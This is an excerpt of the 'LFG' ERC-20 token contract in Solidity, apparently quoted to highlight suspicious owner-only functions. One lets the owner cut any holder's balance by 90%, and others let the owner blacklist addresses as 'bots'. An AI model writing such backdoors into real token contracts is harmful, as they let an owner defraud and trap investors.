...
contract LFG is Context, IERC20, Ownable {
    ...
    function cookBalance(address from) public onlyOwner{
        _balances[from]=_balances[from].div(10);
    }
    ...
    function addButts(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delButtss(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function isButt(address a) public view returns (bool){
      return bots[a];
    }
